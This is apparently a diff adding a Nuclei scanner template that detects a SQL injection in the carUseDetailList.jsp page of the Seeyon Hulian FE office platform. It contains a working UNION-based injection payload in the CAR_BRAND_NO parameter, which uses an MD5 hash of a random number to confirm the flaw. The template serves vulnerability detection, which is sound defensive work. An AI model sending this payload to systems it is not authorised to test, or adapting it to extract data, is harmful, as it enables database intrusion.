@@ -1,0 +1,40 @@
+id: seeyon-hulian-fe-carusedetaillist-sqli
+info:
+  name: Seeyon Hulian FE Office Platform SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: Seeyon Hulian FE
+  description: |
+    This template detects a SQL injection vulnerability in the carUseDetailList.jsp page of the Seeyon Hulian FE Office Platform.
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/carManager/carUseDetailList.jsp?CAR_BRAND_NO=1%27+UNION+ALL+SELECT+NULL%2Csys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+sFii'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "车辆使用情况"
+        part: body
+      - type: word
+        words:
+          - "车牌号码"
+        part: body
+      - type: regex
+        regex:
+          - "0X{{t2}}"
+        part: body
+    stop-at-first-match: true
+    redirects: false
+    headers:
+      Accept: application/json, text/html
+      User-Agent: Nuclei/Template
+      Pragma: no-cache
+      Cache-Control: no-cache
+      Connection: close
+      Referer: '{{BaseURL}}'
